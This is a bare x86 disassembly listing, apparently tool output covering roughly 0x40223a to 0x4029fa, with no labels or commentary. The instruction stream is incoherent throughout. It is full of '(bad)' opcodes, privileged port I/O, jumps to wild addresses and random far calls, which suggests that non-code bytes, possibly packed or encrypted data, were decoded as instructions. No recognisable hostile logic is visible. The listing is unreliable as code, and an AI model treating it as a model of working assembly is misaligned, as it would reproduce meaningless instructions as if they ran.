  40223a:	mov    eax,ds:0x40f24644
  40223f:	dec    ecx
  402240:	(bad)  
  402242:	jge    0x402253
  402244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402245:	sbb    eax,0x731865ec
  40224a:	retf   0x7be1
  40224d:	sti    
  40224e:	mov    WORD PTR [ebx-0x3c],fs
  402251:	cmp    eax,0xfe6b64a1
  402256:	test   eax,0x47c70ab3
  40225b:	xchg   esp,eax
  40225c:	mov    ds:0x8cdac184,al
  402261:	adc    BYTE PTR [ebp+0x29],al
  402264:	call   0x31c7:0x40e8ad8a
  40226b:	jnp    0x40220b
  40226d:	fcom   st(3)
  40226f:	sbb    al,0xa9
  402271:	into   
  402272:	xor    BYTE PTR [ebx+ecx*2-0x375aa088],cl
  402279:	rcl    DWORD PTR [edx+0x6bdb1e3f],0x83
  402280:	cmp    ebp,eax
  402282:	xor    ecx,0xfffffff1
  402285:	aam    0x9d
  402287:	(bad)  
  402288:	sar    DWORD PTR [ecx-0x4ecbbd9a],1
  40228e:	leave  
  40228f:	nop
  402290:	iret   
  402291:	mov    ds:0x9a747f64,al
  402296:	xchg   esi,eax
  402297:	leave  
  402298:	jle    0x40227d
  40229a:	repz loop 0x40224d
  40229d:	xor    bl,bh
  40229f:	mov    fs,WORD PTR [ebp+0x27]
  4022a2:	aam    0xfc
  4022a4:	sub    eax,0xf3494f26
  4022a9:	dec    edi
  4022aa:	inc    ecx
  4022ab:	pop    ss
  4022ac:	cdq    
  4022ad:	dec    ebp
  4022ae:	clc    
  4022af:	push   0x59ada5f0
  4022b4:	dec    eax
  4022b5:	ret    
  4022b6:	sub    edx,DWORD PTR [edi]
  4022b8:	retf   
  4022b9:	out    0xd7,al
  4022bb:	sbb    ah,BYTE PTR [eax+0x7f5572e5]
  4022c1:	push   ds
  4022c2:	push   0x6
  4022c4:	call   0x577f:0x745eb40d
  4022cb:	cwde   
  4022cc:	cmp    bh,BYTE PTR [esi+ecx*2]
  4022cf:	pop    esp
  4022d0:	imul   ecx,DWORD PTR [edx],0x9674d68d
  4022d6:	sub    BYTE PTR [eax+0x74],bh
  4022d9:	in     al,dx
  4022da:	sbb    esi,DWORD PTR [edx-0x49]
  4022dd:	jmp    0xb9096547
  4022e2:	das    
  4022e3:	dec    esp
  4022e4:	sbb    BYTE PTR [edx],0x67
  4022e7:	mov    edx,0xea360f36
  4022ec:	or     eax,0x479a6e61
  4022f1:	popa   
  4022f2:	(bad)  
  4022f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022f4:	cs sub al,0x41
  4022f7:	pop    edx
  4022f8:	jmp    0x402357
  4022fa:	mov    cl,0x4d
  4022fc:	iret   
  4022fd:	mov    ecx,0xee439ee5
  402302:	stc    
  402303:	mov    edx,0xf662ffee
  402308:	or     eax,0xcaa96c01
  40230d:	or     BYTE PTR [edx+edx*4],ah
  402310:	cs sub eax,0xf7c3df3
  402316:	aas    
  402317:	mov    WORD PTR [edi-0x2b727f0a],cs
  40231d:	pop    ebx
  40231e:	outs   dx,DWORD PTR ds:[esi]
  40231f:	cld    
  402320:	mov    al,ds:0xd5669fca
  402325:	add    bl,bl
  402327:	(bad)  
  402328:	cmp    ebx,eax
  40232a:	push   ecx
  40232b:	push   esi
  40232c:	mov    al,ds:0xbb3fb4a1
  402331:	mov    edi,0xdd2cfe02
  402336:	jbe    0x4022dd
  402338:	loope  0x402371
  40233a:	sub    al,0x24
  40233c:	dec    eax
  40233d:	sub    BYTE PTR [ecx+0xc5cfc01],bl
  402343:	pop    ds
  402344:	add    eax,0x321c5fc0
  402349:	fcmovne st,st(5)
  40234b:	std    
  40234c:	xor    al,0x80
  40234e:	push   eax
  40234f:	ins    BYTE PTR es:[edi],dx
  402350:	jge    0x402370
  402352:	add    ebx,DWORD PTR [ecx]
  402354:	or     DWORD PTR [ebx-0x57e19c63],ebx
  40235a:	shr    DWORD PTR [ebp+0x65],0x7d
  40235e:	ins    DWORD PTR es:[edi],dx
  40235f:	sub    ah,dl
  402361:	inc    ebp
  402362:	cmp    eax,0xe7a82457
  402367:	jb     0x4023c6
  402369:	aaa    
  40236a:	imul   esp,DWORD PTR [ebx+0x5d132ba6],0xcb353186
  402374:	icebp  
  402375:	test   BYTE PTR [ecx],bh
  402377:	jbe    0x402370
  402379:	sbb    ah,dh
  40237b:	pop    ds
  40237c:	into   
  40237d:	loopne 0x4023c4
  40237f:	mov    dh,0x51
  402381:	sub    DWORD PTR cs:[eax],esp
  402384:	mov    ebp,0x27d9b7eb
  402389:	or     BYTE PTR [ebx+0x22bb4ab4],bh
  40238f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402390:	out    dx,al
  402391:	push   es
  402392:	push   ecx
  402393:	xchg   BYTE PTR [eax+0x6f51c2a5],al
  402399:	sub    edi,eax
  40239b:	unpckhps xmm3,xmm1
  40239e:	and    al,0x3e
  4023a0:	sbb    al,0xff
  4023a2:	outs   dx,BYTE PTR ds:[esi]
  4023a3:	or     dh,BYTE PTR [edx+0x1a]
  4023a6:	das    
  4023a7:	outs   dx,BYTE PTR ds:[esi]
  4023a8:	(bad)  
  4023a9:	int3   
  4023aa:	lds    edi,FWORD PTR [ebx]
  4023ac:	sbb    eax,0xf9082730
  4023b1:	sahf   
  4023b2:	lahf   
  4023b3:	retf   0x9070
  4023b6:	ins    DWORD PTR es:[edi],dx
  4023b7:	xor    eax,0x6966d69c
  4023bc:	mov    esp,0x8caee010
  4023c1:	scas   al,BYTE PTR es:[edi]
  4023c2:	cmp    eax,DWORD PTR [ebp-0x40cca25f]
  4023c8:	aas    
  4023c9:	pop    ebp
  4023ca:	cmp    DWORD PTR [edi+0x40],0xc958de94
  4023d1:	or     al,0xb5
  4023d3:	inc    ecx
  4023d4:	out    dx,eax
  4023d5:	out    dx,al
  4023d6:	sahf   
  4023d7:	rol    BYTE PTR [ebx+0x73],0xa2
  4023db:	scas   al,BYTE PTR es:[edi]
  4023dc:	or     eax,DWORD PTR [edx]
  4023de:	add    al,0x28
  4023e0:	clc    
  4023e1:	adc    BYTE PTR [ebx-0xe],dl
  4023e4:	(bad)  
  4023e5:	sbb    al,0x84
  4023e7:	(bad)  
  4023e8:	arpl   WORD PTR ds:0x1c237fb0,cx
  4023ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ef:	out    0xfe,al
  4023f1:	jp     0x402430
  4023f3:	fldcw  WORD PTR [ecx+0x1ee1d806]
  4023f9:	xor    DWORD PTR [edi-0x519ae0dc],ecx
  4023ff:	adc    DWORD PTR [ebp-0x46fb5fee],ebx
  402405:	add    eax,0x88d88521
  40240a:	push   0x19bd6772
  40240f:	in     eax,0x7f
  402411:	push   ds
  402412:	pop    ebp
  402413:	pop    eax
  402414:	xchg   DWORD PTR ds:0x1809174a,esi
  40241a:	les    ebx,FWORD PTR [eax+0x2fe3354]
  402420:	inc    edi
  402421:	repnz imul esi,DWORD PTR [edx+0x60],0xfffffffc
  402426:	fwait
  402427:	stos   BYTE PTR es:[edi],al
  402428:	cmp    eax,0x168e3993
  40242d:	icebp  
  40242e:	sbb    DWORD PTR [eax+esi*8+0x46],0x39
  402433:	sub    DWORD PTR [ebp-0x191c31f9],esp
  402439:	add    DWORD PTR es:[ecx-0x2e],edx
  40243d:	jmp    0x1aae9de2
  402442:	cmp    eax,0x1d5d9005
  402447:	in     al,dx
  402448:	mov    esi,0xfe6d3462
  40244d:	mov    ebx,esi
  40244f:	mov    edx,DWORD PTR [edx-0x1f70267c]
  402455:	in     al,dx
  402456:	pop    edi
  402457:	pop    eax
  402458:	lock je 0x40243d
  40245b:	or     DWORD PTR [eax+0x398e6a9b],esi
  402461:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  402463:	retf   
  402464:	loopne 0x4024cd
  402466:	xor    eax,DWORD PTR [eax+0xa]
  402469:	mov    cl,BYTE PTR [edi-0x6aa29256]
  40246f:	je     0x402490
  402471:	leave  
  402472:	inc    DWORD PTR [eax+0x74]
  402475:	stos   DWORD PTR es:[edi],eax
  402476:	fnstenv [edx+eiz*2+0x205fdc67]
  40247d:	mov    eax,0x5edd2543
  402482:	mov    ah,0x7b
  402484:	xor    eax,0x12fa06ef
  402489:	shl    DWORD PTR [ebx],0x78
  40248c:	popa   
  40248d:	dec    eax
  40248e:	pop    edi
  40248f:	and    al,0x10
  402491:	in     eax,dx
  402492:	xchg   esp,eax
  402493:	mov    edi,0xedba69bd
  402498:	xor    DWORD PTR ds:0xa1491ae3,eax
  40249e:	dec    esi
  40249f:	loope  0x402484
  4024a1:	pop    esi
  4024a2:	mov    esi,DWORD PTR [eax*4+0x4d64d331]
  4024a9:	nop
  4024aa:	inc    ebp
  4024ab:	aad    0x6
  4024ad:	mov    esp,0x7992a9d4
  4024b2:	sbb    ecx,DWORD PTR [ecx+0x33]
  4024b5:	jbe    0x40248f
  4024b7:	(bad)  
  4024b8:	mov    al,ds:0x6fa97859
  4024bd:	test   cl,bh
  4024bf:	fisub  DWORD PTR [ecx*2+0x1e102e2a]
  4024c6:	xor    al,dl
  4024c8:	loopne 0x4024ba
  4024ca:	iret   
  4024cb:	xor    esp,ebp
  4024cd:	xor    eax,0xa58af
  4024d2:	mov    eax,0x98beeec0
  4024d7:	cdq    
  4024d8:	retf   
  4024d9:	add    eax,0xf697f805
  4024de:	inc    ebp
  4024df:	sub    cl,al
  4024e1:	mov    esp,0x1d153e9f
  4024e6:	dec    esi
  4024e7:	das    
  4024e8:	(bad)  
  4024e9:	mov    ebx,0x2ff461c3
  4024ee:	out    0x91,al
  4024f0:	mov    eax,0x5ce81091
  4024f5:	sbb    ah,BYTE PTR [edi-0x358c98d9]
  4024fb:	xchg   BYTE PTR [eax+0x13],ch
  4024fe:	sub    eax,0x75a00774
  402503:	cs and ecx,DWORD PTR es:0xd1a17747
  40250b:	sbb    BYTE PTR [edx],ah
  40250d:	jne    0x4024b0
  40250f:	retf   
  402510:	push   ds
  402511:	mov    ch,BYTE PTR [ecx+0x1d4e7c20]
  402517:	push   edx
  402518:	sbb    al,0x58
  40251a:	call   FWORD PTR [edx+0x3a]
  40251d:	xor    dh,BYTE PTR [ebp+0x2ef64efc]
  402523:	dec    edi
  402524:	call   0x93c10db8
  402529:	add    DWORD PTR [edx-0x40e7bb7e],edx
  40252f:	jmp    0x40250d
  402531:	dec    ebx
  402532:	outs   dx,DWORD PTR ds:[esi]
  402533:	cmc    
  402534:	popfw  
  402536:	fiadd  WORD PTR [eax]
  402538:	xchg   ebx,eax
  402539:	xor    DWORD PTR [eax-0x230fea3a],edi
  40253f:	xor    eax,0x42c6fe6b
  402544:	rol    BYTE PTR ds:0xeed333b9,1
  40254a:	add    ah,BYTE PTR [edi+ebp*4-0x11]
  40254e:	pop    esi
  40254f:	aad    0xed
  402551:	rcl    BYTE PTR [eax+ebp*2],0x20
  402555:	pop    esi
  402556:	or     eax,0x967d44a6
  40255b:	xchg   esi,eax
  40255c:	xchg   esi,eax
  40255d:	jae    0x40251c
  40255f:	or     BYTE PTR [esi],al
  402561:	out    dx,al
  402562:	jecxz  0x402521
  402564:	dec    esi
  402565:	sbb    BYTE PTR [edx-0x8],dl
  402568:	mov    bl,0x31
  40256a:	jns    0x40252a
  40256c:	ja     0x40259d
  40256e:	dec    eax
  40256f:	jnp    0x4025b3
  402571:	daa    
  402572:	jmp    0x402521
  402574:	daa    
  402575:	aam    0x84
  402577:	loope  0x40257a
  402579:	fnstcw WORD PTR [esp+ebp*8-0x68]
  40257d:	repz dec ecx
  40257f:	enter  0xc591,0xb8
  402583:	adc    al,0x29
  402585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402586:	mov    eax,ds:0xdee4bfd6
  40258b:	pop    esp
  40258c:	add    BYTE PTR [eax+0x1a726eec],bh
  402592:	push   ebx
  402593:	jg     0x4025eb
  402595:	shl    dl,0x38
  402598:	jbe    0x40257d
  40259a:	pop    DWORD PTR [esi-0x4f]
  40259d:	cmp    al,0xe2
  40259f:	cmp    DWORD PTR [esi],edi
  4025a1:	out    dx,eax
  4025a2:	mov    ds:0x71bd9943,al
  4025a7:	ret    0x308
  4025aa:	outs   dx,BYTE PTR ds:[esi]
  4025ab:	aam    0xa9
  4025ad:	scas   al,BYTE PTR es:[edi]
  4025ae:	ror    DWORD PTR [ebx+0x559164a9],0x42
  4025b5:	lahf   
  4025b6:	outs   dx,BYTE PTR ds:[esi]
  4025b7:	clc    
  4025b8:	pushf  
  4025b9:	mov    ss,WORD PTR [eax+0x30bba60c]
  4025bf:	jo     0x4025aa
  4025c1:	mov    esi,0x5c06d20e
  4025c6:	or     al,0x63
  4025c8:	inc    eax
  4025c9:	mov    dh,0x8e
  4025cb:	es in  al,0x1
  4025ce:	inc    ebp
  4025cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025d0:	cmp    al,BYTE PTR [ebx-0x61]
  4025d3:	adc    ch,BYTE PTR [edi]
  4025d5:	ins    DWORD PTR es:[edi],dx
  4025d6:	mov    al,ds:0x42c750d4
  4025db:	in     eax,dx
  4025dc:	mov    ecx,0x771da240
  4025e1:	dec    esp
  4025e2:	gs inc esp
  4025e4:	(bad)  
  4025e5:	mov    cl,0x5b
  4025e7:	dec    ecx
  4025e8:	and    eax,0xb33449d2
  4025ed:	or     ecx,DWORD PTR [edi-0x9]
  4025f0:	push   esi
  4025f1:	retf   
  4025f2:	cdq    
  4025f3:	fadd   DWORD PTR [esi+0x4bbeff1c]
  4025f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025fa:	test   al,0xaa
  4025fc:	xchg   edx,eax
  4025fd:	pop    esp
  4025fe:	mov    ecx,esi
  402600:	out    0x3d,al
  402602:	or     al,0x8b
  402604:	fucomi st,st(1)
  402606:	dec    esi
  402607:	add    eax,0xfd17a706
  40260c:	dec    esi
  40260d:	mov    edx,0x3b11b3f6
  402612:	pop    ds
  402613:	aam    0x26
  402615:	cmp    eax,0x4c8a9cea
  40261a:	ins    BYTE PTR es:[edi],dx
  40261b:	xchg   esp,eax
  40261c:	jle    0x402693
  40261e:	jp     0x4025e0
  402620:	fsub   DWORD PTR [ebp+ebp*2-0x3e]
  402624:	mov    al,ds:0x1c15f293
  402629:	cmp    DWORD PTR [edi+eax*1-0x74b13a98],esp
  402630:	cs jge 0x4025df
  402633:	jecxz  0x4025fe
  402635:	mov    edx,edi
  402637:	out    0x54,eax
  402639:	xchg   edx,eax
  40263a:	pop    ebx
  40263b:	aad    0xc5
  40263d:	shr    ah,0xae
  402640:	cmp    edi,DWORD PTR [esi+0x32716f1]
  402646:	ins    BYTE PTR es:[edi],dx
  402647:	jl     0x40265b
  402649:	dec    edx
  40264a:	pop    ebp
  40264b:	ret    0x7f5
  40264e:	ret    0xce61
  402651:	push   edx
  402652:	das    
  402653:	arpl   di,si
  402655:	mov    ds:0x75ae529f,al
  40265a:	jecxz  0x402696
  40265c:	jmp    0xfd08c51b
  402661:	sbb    DWORD PTR [esp+eiz*4-0x34],ebx
  402665:	repz fsub st(1),st
  402668:	push   ds
  402669:	int3   
  40266a:	pop    ss
  40266b:	mov    dl,BYTE PTR [edx-0x7a]
  40266e:	mov    esp,ss
  402670:	add    BYTE PTR [edi],ah
  402672:	(bad)  
  402673:	pop    edx
  402675:	(bad)  
  402676:	dec    BYTE PTR [ebp+0x66bcf694]
  40267c:	mov    eax,ss
  40267e:	fiadd  WORD PTR [edx+0x37]
  402681:	data16 xor al,0x67
  402684:	cdq    
  402685:	iret   
  402686:	in     al,dx
  402687:	and    BYTE PTR [edx+0x77],cl
  40268a:	into   
  40268b:	pop    esp
  40268c:	fisubr WORD PTR [edx-0x6c]
  40268f:	es pop ebp
  402691:	sub    BYTE PTR [edi],bh
  402693:	pop    edx
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	nop
  402696:	or     BYTE PTR [edx-0x7c],dh
  402699:	ins    DWORD PTR es:[edi],dx
  40269a:	lds    esi,FWORD PTR [eax+0x44]
  40269d:	jg     0x402678
  40269f:	bound  esi,QWORD PTR [eax+edi*4-0x61147e9d]
  4026a6:	jo     0x40262d
  4026a8:	pop    ebx
  4026a9:	in     al,0xdb
  4026ab:	(bad)  
  4026ac:	daa    
  4026ad:	sub    ecx,edx
  4026af:	jle    0x4026a2
  4026b1:	(bad)  
  4026b2:	pop    esp
  4026b3:	xor    ebx,esi
  4026b5:	shl    DWORD PTR [edx-0xa],cl
  4026b8:	not    BYTE PTR [esi]
  4026ba:	retf   0x8bd2
  4026bd:	pop    es
  4026be:	dec    ecx
  4026bf:	jne    0x4026bc
  4026c1:	int    0x86
  4026c3:	mov    ah,0x7a
  4026c5:	and    eax,0xb83c9ec9
  4026ca:	pop    edx
  4026cb:	xchg   ebx,eax
  4026cc:	or     dh,dh
  4026ce:	popf   
  4026cf:	test   esp,edx
  4026d1:	inc    ebp
  4026d2:	das    
  4026d3:	jge    0x402665
  4026d5:	dec    eax
  4026d6:	mov    esi,0x4ebe4123
  4026db:	jnp    0x402731
  4026dd:	xchg   eax,esi
  4026df:	xlat   BYTE PTR ds:[ebx]
  4026e0:	scas   eax,DWORD PTR es:[edi]
  4026e1:	scas   eax,DWORD PTR es:[edi]
  4026e2:	dec    edi
  4026e3:	xor    eax,0xe042b8a0
  4026e8:	push   edi
  4026e9:	cmp    eax,0x31077520
  4026ee:	cdq    
  4026ef:	ins    BYTE PTR es:[edi],dx
  4026f0:	loope  0x4026be
  4026f2:	xchg   esp,eax
  4026f3:	cmp    DWORD PTR [ebx+0x75d58873],edi
  4026f9:	stos   DWORD PTR es:[edi],eax
  4026fa:	shl    ebp,0x26
  4026fd:	sbb    BYTE PTR [eax],dh
  4026ff:	aam    0xa5
  402701:	push   ebp
  402702:	mov    ch,0x0
  402704:	nop
  402705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402706:	(bad)  
  402707:	mov    al,ds:0xbf493390
  40270c:	push   eax
  40270d:	stos   BYTE PTR es:[edi],al
  40270e:	mov    cl,0xe3
  402710:	lods   al,BYTE PTR ds:[esi]
  402711:	aam    0xf6
  402713:	mov    ecx,0x1ccad713
  402718:	cmp    BYTE PTR [edx+0x5626121f],al
  40271e:	repz int3 
  402720:	mov    al,dl
  402722:	popf   
  402723:	push   eax
  402724:	jmp    0x402700
  402726:	xchg   edx,eax
  402727:	retf   0xce3e
  40272a:	jnp    0x4026fa
  40272c:	outs   dx,DWORD PTR ds:[esi]
  40272d:	add    cl,dh
  40272f:	loopne 0x4026d3
  402731:	xchg   esp,eax
  402732:	mov    BYTE PTR [ecx-0x3e],dl
  402735:	dec    ebp
  402736:	(bad)  
  402737:	mov    dl,0x45
  402739:	adc    al,0x2e
  40273b:	(bad)  
  40273c:	cmp    eax,0xfd7ddf51
  402741:	lods   eax,DWORD PTR ds:[esi]
  402742:	imul   ebp,DWORD PTR [ecx-0x5b],0xd25c0b29
  402749:	lods   al,BYTE PTR ds:[esi]
  40274a:	mov    dl,0x59
  40274c:	sub    al,dl
  40274e:	fimul  DWORD PTR [ebx]
  402750:	add    eax,0x7462d6d0
  402755:	adc    edx,eax
  402757:	jne    0x4027c0
  402759:	faddp  st(4),st
  40275b:	enter  0x8cc3,0x94
  40275f:	mov    cl,0x84
  402761:	cmp    edi,edx
  402763:	inc    eax
  402764:	es push 0xd3065c2e
  40276a:	xor    al,0x3a
  40276c:	jl     0x4027a2
  40276e:	lods   al,BYTE PTR ds:[esi]
  40276f:	nop
  402770:	dec    ecx
  402771:	popf   
  402772:	push   ecx
  402773:	pop    esi
  402774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402775:	jl     0x4027a7
  402777:	or     bh,dl
  402779:	cdq    
  40277a:	mov    esi,0xd63bf055
  40277f:	(bad)  
  402780:	ja     0x40274e
  402782:	or     al,BYTE PTR [edi]
  402784:	xchg   ebx,eax
  402786:	sub    al,0x2a
  402788:	sub    edx,DWORD PTR [ebx+0x7827887c]
  40278e:	jl     0x4027a3
  402790:	pop    es
  402791:	ins    DWORD PTR es:[edi],dx
  402792:	fwait
  402793:	pusha  
  402794:	and    ah,ch
  402796:	sub    BYTE PTR [esi-0x7a],bl
  402799:	dec    edx
  40279a:	or     edi,DWORD PTR [ebx-0x3daf7376]
  4027a0:	sbb    eax,ebx
  4027a2:	imul   edi,DWORD PTR [ecx],0x5e
  4027a5:	jmp    0x27cf85c2
  4027aa:	push   ecx
  4027ab:	xchg   DWORD PTR [ebp-0x62],edi
  4027ae:	jnp    0x4027bc
  4027b0:	dec    esp
  4027b1:	or     cl,bl
  4027b3:	or     BYTE PTR [edx-0x2f],0xf2
  4027b7:	bound  edx,QWORD PTR [edx-0x11]
  4027ba:	pop    esp
  4027bb:	dec    ebp
  4027bc:	add    BYTE PTR [ebx+0x12],0x6e
  4027c0:	aas    
  4027c1:	loopne 0x402815
  4027c3:	jecxz  0x4027a2
  4027c5:	jmp    0xe29a:0xa2e52b1f
  4027cc:	cmp    DWORD PTR [ecx],0xffffff96
  4027cf:	xchg   dh,cl
  4027d1:	add    eax,DWORD PTR [ecx+0xd]
  4027d4:	dec    edx
  4027d5:	adc    al,0xe2
  4027d7:	lods   eax,DWORD PTR ds:[esi]
  4027d8:	cli    
  4027d9:	sub    al,0xa6
  4027db:	iret   
  4027dc:	fcmovbe st,st(3)
  4027de:	and    al,bl
  4027e0:	ss xchg edi,eax
  4027e2:	or     bh,0x12
  4027e5:	dec    ebp
  4027e6:	pop    edi
  4027e7:	mov    al,ds:0x43512f30
  4027ec:	mov    WORD PTR [eax+0xb],gs
  4027ef:	clc    
  4027f0:	and    eax,0x2d3f10eb
  4027f5:	cs pushf 
  4027f7:	push   0xffffffa5
  4027f9:	add    cl,BYTE PTR [ebp+0x5467cdd0]
  4027ff:	bnd jmp 0x4027b8
  402802:	and    al,0xe8
  402804:	sar    BYTE PTR [ecx+0x31],cl
  402807:	nop
  402808:	loop   0x4027c8
  40280a:	std    
  40280b:	lds    esp,FWORD PTR ss:[ebx+0x28588784]
  402812:	stos   DWORD PTR es:[edi],eax
  402813:	push   esp
  402814:	jmp    0xcab97e8f
  402819:	lock fist DWORD PTR [ebx+0x49]
  40281d:	fs sbb dh,bl
  402820:	sub    dh,BYTE PTR [edx-0x7cbb2c55]
  402826:	add    edi,esi
  402828:	ins    BYTE PTR es:[edi],dx
  402829:	in     al,dx
  40282a:	xchg   esp,eax
  40282b:	stc    
  40282c:	call   0x536d204
  402831:	add    esi,edi
  402833:	xor    BYTE PTR [edx],0x4f
  402836:	mov    esi,DWORD PTR [edx+0x457312f6]
  40283c:	push   esp
  40283d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40283e:	div    BYTE PTR [eax+0x1b]
  402841:	and    DWORD PTR [edx+0x179cf603],esi
  402847:	lds    ebx,FWORD PTR [eax-0x37a0830e]
  40284d:	and    eax,0xd3395b3c
  402852:	scas   eax,DWORD PTR es:[edi]
  402853:	call   0xe0ecaaf7
  402858:	xor    eax,ecx
  40285a:	test   DWORD PTR [ebp+0x1a14380e],0xf9655a6c
  402864:	and    DWORD PTR ds:0x7c2472d6,esi
  40286a:	or     DWORD PTR [edx],esp
  40286c:	sub    BYTE PTR [ecx-0x74f5f8bf],dh
  402872:	push   0xffffffdc
  402874:	test   eax,0x150e4d41
  402879:	loope  0x4028a4
  40287b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40287c:	retf   
  40287d:	xchg   esi,eax
  40287e:	pop    esp
  40287f:	mov    ebp,0x1f00e62f
  402884:	in     al,dx
  402885:	pop    ds
  402886:	cmp    eax,edx
  402888:	inc    ebx
  402889:	daa    
  40288a:	xchg   edx,eax
  40288b:	dec    esp
  40288c:	jmp    0x84199c85
  402891:	sbb    eax,0xf5496a37
  402896:	or     al,bl
  402898:	call   0x49dc5b03
  40289d:	inc    eax
  40289e:	jb     0x402853
  4028a0:	xchg   edx,eax
  4028a1:	cmc    
  4028a2:	xor    BYTE PTR [ecx-0x52],dh
  4028a5:	lahf   
  4028a6:	xchg   edi,eax
  4028a7:	idiv   BYTE PTR [ebx-0x474713d3]
  4028ad:	js     0x402836
  4028af:	pop    ds
  4028b0:	(bad)  
  4028b1:	lods   al,BYTE PTR ds:[esi]
  4028b2:	ret    0xbfb5
  4028b5:	rep outs dx,DWORD PTR ds:[esi]
  4028b7:	push   ds
  4028b8:	out    dx,al
  4028b9:	fdivrp st(3),st
  4028bb:	ins    DWORD PTR es:[edi],dx
  4028bc:	sbb    dl,BYTE PTR ds:0x8b81bb72
  4028c2:	mov    eax,0xb57f6235
  4028c7:	inc    eax
  4028c8:	aas    
  4028c9:	outs   dx,BYTE PTR ds:[esi]
  4028ca:	les    eax,FWORD PTR [eax-0x1c09832]
  4028d0:	cmovne eax,DWORD PTR [ebx+edi*2-0x5b424b1f]
  4028d8:	std    
  4028d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028da:	jnp    0x4028e7
  4028dc:	jo     0x4028ef
  4028de:	nop
  4028df:	icebp  
  4028e0:	(bad)  
  4028e1:	mov    ds:0x705b77e9,eax
  4028e6:	add    ebx,esp
  4028e8:	push   ebp
  4028e9:	and    esp,DWORD PTR [ecx]
  4028eb:	pop    ebp
  4028ec:	mov    ebx,0x884e4f08
  4028f1:	test   DWORD PTR [ebp-0x4e],ebp
  4028f4:	dec    DWORD PTR [ebx+0x644a219f]
  4028fa:	add    al,0xcc
  4028fc:	jmp    eax
  4028fe:	ins    BYTE PTR es:[edi],dx
  4028ff:	sub    DWORD PTR [esi+esi*2-0x39],edx
  402903:	mov    edi,0xc1efaa19
  402908:	jmp    DWORD PTR [ebp-0x3a15fe39]
  40290e:	dec    esi
  40290f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402910:	lods   eax,DWORD PTR ds:[esi]
  402911:	add    DWORD PTR [ebp+0x27b105d5],esi
  402917:	ret    
  402918:	sahf   
  402919:	push   eax
  40291a:	ret    0xe7de
  40291d:	enter  0x3f5a,0xc5
  402921:	fs loopne 0x402951
  402924:	xchg   esp,eax
  402925:	pop    ebp
  402926:	ss popa 
  402928:	sbb    esi,DWORD PTR [edi-0x76]
  40292b:	sbb    al,0xa0
  40292d:	adc    eax,0xeb9143c4
  402932:	iret   
  402933:	loope  0x402927
  402935:	cdq    
  402936:	cmp    eax,0x7ae83493
  40293b:	maxps  xmm1,XMMWORD PTR [edi]
  40293e:	jb     0x4028e1
  402940:	xchg   ebp,eax
  402941:	or     BYTE PTR [edi+0x38],0x15
  402945:	mov    ah,BYTE PTR [edi]
  402947:	xlat   BYTE PTR ds:[ebx]
  402949:	leave  
  40294a:	lds    edx,FWORD PTR [edi-0x52]
  40294d:	in     al,dx
  40294e:	(bad)  
  40294f:	xor    BYTE PTR ds:0x652d6d29,cl
  402955:	sub    bl,BYTE PTR [ecx+0x29fc3705]
  40295b:	call   0x5b1a9ff4
  402960:	out    0x26,al
  402962:	mov    cs,WORD PTR fs:[edx]
  402965:	scas   eax,DWORD PTR es:[edi]
  402966:	je     0x4028fe
  402968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402969:	sahf   
  40296a:	xchg   ecx,eax
  40296b:	rol    BYTE PTR [edx+eax*8+0x42],1
  40296f:	test   DWORD PTR [eax+0x8],edi
  402972:	push   edi
  402973:	out    0xcf,al
  402975:	stos   DWORD PTR es:[edi],eax
  402976:	(bad)  
  402977:	popa   
  402978:	mov    esp,0x5937c19d
  40297d:	mov    bl,BYTE PTR [edx]
  40297f:	sub    eax,0xfa38a721
  402984:	dec    eax
  402985:	sti    
  402986:	es pop esi
  402988:	sub    BYTE PTR [edi+0x5b0cfa2a],ch
  40298e:	in     al,dx
  40298f:	mov    dh,0x75
  402991:	cmp    al,0x57
  402993:	shl    edi,1
  402995:	ss popf 
  402997:	and    al,0x1e
  402999:	jb     0x402a0b
  40299b:	cli    
  40299c:	cli    
  40299d:	add    ecx,0x44d96d59
  4029a3:	push   esp
  4029a4:	cmp    al,al
  4029a6:	pop    edx
  4029a7:	xor    DWORD PTR [edx+0x7f],0x54
  4029ab:	fiadd  WORD PTR [esp+eax*4+0x57079ad2]
  4029b2:	mov    al,0x24
  4029b4:	imul   ecx,DWORD PTR ds:0xcab28c3a,0x77
  4029bb:	xchg   esp,eax
  4029bc:	stos   DWORD PTR es:[edi],eax
  4029bd:	outs   dx,BYTE PTR ds:[esi]
  4029be:	dec    esi
  4029bf:	sar    BYTE PTR [ebp+0xd],0x22
  4029c3:	(bad)  
  4029c4:	retf   
  4029c5:	iret   
  4029c6:	or     al,0x19
  4029c8:	jo     0x402a30
  4029ca:	adc    BYTE PTR [ecx],0xb9
  4029cd:	out    dx,al
  4029ce:	stos   DWORD PTR es:[edi],eax
  4029cf:	or     esi,DWORD PTR [edi]
  4029d1:	aaa    
  4029d2:	lods   al,BYTE PTR ds:[esi]
  4029d3:	lods   al,BYTE PTR ds:[esi]
  4029d4:	lahf   
  4029d5:	xchg   ecx,eax
  4029d6:	es jp  0x402a1c
  4029d9:	xchg   BYTE PTR [eax+0x25],ah
  4029dc:	push   0xffffffac
  4029de:	and    esi,eax
  4029e0:	(bad)  
  4029e1:	mov    edx,0x72a4ac73
  4029e6:	jae    0x40299c
  4029e8:	or     al,0x64
  4029ea:	pop    ecx
  4029eb:	into   
  4029ec:	mov    bh,0x48
  4029ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029ef:	loope  0x402a2b
  4029f1:	jl     0x4029cc
  4029f3:	out    0xe,eax
  4029f5:	popf   
  4029f6:	dec    edx
  4029f7:	or     dh,dh
  4029f9:	push   ebx
  4029fa:	xchg   ebp,eax
